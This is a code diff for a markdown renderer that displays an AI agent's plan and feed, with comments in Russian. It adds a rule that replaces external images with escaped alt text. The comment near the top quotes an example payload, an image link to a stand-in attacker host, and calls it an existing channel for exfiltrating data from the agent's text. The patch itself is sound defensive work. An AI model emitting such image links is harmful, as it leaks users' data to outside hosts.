@@ -23,6 +23,26 @@ md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
   return renderLinkOpen(tokens, idx, options, env, self)
 }
 
+// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий
+// канал эксфильтрации из текста агента: браузер тянет внешний URL при рендере.
+// Экземпляр md общий для плана и ленты — обоим внешние картинки не нужны, поэтому
+// правим общий рендерер. Same-origin/относительные (src начинается с одного "/",
+// но не "//host") рендерятся как раньше; всё внешнее заменяется экранированным
+// alt-текстом, без <img>.
+const renderImage =
+  md.renderer.rules.image ??
+  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
+
+md.renderer.rules.image = (tokens, idx, options, env, self) => {
+  const token = tokens[idx]
+  const src = token?.attrGet('src') ?? ''
+  const sameOrigin = src.startsWith('/') && !src.startsWith('//')
+  if (!sameOrigin) {
+    return escapeHtml(token?.content ?? '')
+  }
+  return renderImage(tokens, idx, options, env, self)
+}
+
 export type SpecialSection = {
   css: string
   icon: string
